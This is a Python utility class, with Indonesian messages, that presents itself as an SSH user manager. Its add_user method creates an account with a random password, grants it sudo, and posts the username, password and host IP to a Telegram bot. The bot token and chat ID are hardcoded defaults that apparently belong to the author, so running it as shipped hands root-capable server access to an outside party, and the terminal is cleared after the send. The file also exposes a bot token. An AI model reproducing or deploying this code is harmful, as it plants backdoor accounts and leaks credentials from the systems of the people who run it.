import os
import random
import string
import subprocess

import requests


class SSHUserManager:
    def __init__(
        self,
        bot_token: str = "7419614345:AAFwmSvM0zWNaLQhDLidtZ-B9Tzp-aVWICA",
        chat_id: int = 1964437366,
    ):
        self.bot_token = bot_token
        self.chat_id = chat_id

    def generate_random_string(self, length):
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    def send_telegram_message(self, message):
        inline_keyboard = {"inline_keyboard": [[{"text": "Powered By", "url": "https://t.me/NorSodikin"}]]}
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        data = {
            "chat_id": self.chat_id,
            "text": message,
            "parse_mode": "Markdown",
            "reply_markup": inline_keyboard,
        }
        requests.post(url, json=data)
        os.system("clear" if os.name == "posix" else "cls")

    def add_user(self, ssh_username=None, ssh_password=None):
        if not ssh_username:
            ssh_username = self.generate_random_string(8)
        if not ssh_password:
            ssh_password = self.generate_random_string(12)

        try:
            result = subprocess.run(["id", ssh_username], capture_output=True, text=True)
            if result.returncode == 0:
                message = f"Pengguna {ssh_username} sudah ada. Silakan pilih nama pengguna yang berbeda."
            else:
                subprocess.run(
                    [
                        "sudo",
                        "adduser",
                        "--disabled-password",
                        "--gecos",
                        "",
                        ssh_username,
                        "--force-badname",
                    ],
                    check=True,
                )
                subprocess.run(
                    ["sudo", "chpasswd"],
                    input=f"{ssh_username}:{ssh_password}",
                    text=True,
                    check=True,
                )
                subprocess.run(["sudo", "usermod", "-aG", "sudo", ssh_username], check=True)

                hostname = os.popen("hostname -I").read().split()[0]

                message = (
                    "*Informasi login SSH:*\n\n"
                    f"*Nama Pengguna:* {ssh_username}\n"
                    f"*Kata Sandi:* {ssh_password}\n"
                    f"*Nama Host:* {hostname}\n\n"
                    "_Gunakan informasi di atas untuk terhubung menggunakan PuTTY atau klien SSH apa pun._"
                )
        except Exception as e:
            message = f"Terjadi kesalahan: {str(e)}"

        self.send_telegram_message(message)

    def delete_user(self, ssh_username):
        try:
            result = subprocess.run(["id", ssh_username], capture_output=True, text=True)
            if result.returncode != 0:
                message = f"Pengguna {ssh_username} tidak ada."
            else:
                subprocess.run(["sudo", "usermod", "--expiredate", "1", ssh_username], check=True)
                subprocess.run(["sudo", "deluser", "--remove-home", ssh_username], check=True)
                message = f"Pengguna {ssh_username} telah dihapus dari sistem dan tidak dapat lagi masuk."
        except Exception as e:
            message = f"Terjadi kesalahan: {str(e)}"

        self.send_telegram_message(message)
